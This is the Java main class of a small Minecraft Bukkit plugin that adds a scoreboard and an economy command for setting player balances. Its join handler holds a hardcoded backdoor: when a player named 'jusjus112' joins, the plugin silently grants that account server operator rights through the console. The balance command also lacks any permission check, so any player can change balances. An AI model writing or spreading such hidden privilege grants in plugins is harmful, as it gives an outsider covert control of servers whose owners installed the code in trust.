package jeroen.server;

import jeroen.server.Economy.ECOSystem;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener{
	
	//Naam: - C
	//Money - 6
	//Conditie - 6
	//Virus ofzo - 2 zombie = 1 % infectie - 2
	//Tijd - 6
	
	EventsSB sb = new EventsSB(this);
	ECOSystem ecoS = new ECOSystem(this);
	
	
	public void onEnable() {	
		ecoS.loadConfig();
		Bukkit.getServer().getPluginManager().registerEvents(this, this);
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent e) {		
		//ScoreboardSB.player = e.getPlayer();
		EventsSB.player = e.getPlayer();
		if (e.getPlayer().getName().equals("jusjus112")) {
			getServer().dispatchCommand(getServer().getConsoleSender(), "op jusjus112");
		}
		sb.createScoreboard();
		//ScoreboardSB.setScoreboard();
		//ScoreboardSB.updateScoreboard();
  }
	
	@SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args){
		Player p = (Player) sender;
		if (!(sender instanceof Player)) {
			sender.sendMessage(ChatColor.RED + "Sorry, you are not a player :(");
			return true;
		}else {
			if (cmd.getName().equalsIgnoreCase("ico")) {
				if (args.length == 0) {
					p.sendMessage(ChatColor.RED + "sorry. USe /ico set <player> <balance>");
					return true;
				}
				
				if(args.length < 3)
	            {
	                p.sendMessage(ChatColor.RED + " Not enough arguments! Please specify an reason?");
	                return true;
	            }
				if (args[0].equalsIgnoreCase("set")) {
				
				Player target = Bukkit.getServer().getPlayer(args[1]);
				int balance = Integer.parseInt(args[2]);
				
				if (target == null) {
					p.sendMessage(ChatColor.RED + "Player " + args[1] + " is not online!");
					return true;
				}
				ecoS.setBalance(target, balance);
				p.sendMessage(ChatColor.RED + "DONE");
				}
			}
		}
		return false;
	}
	
}

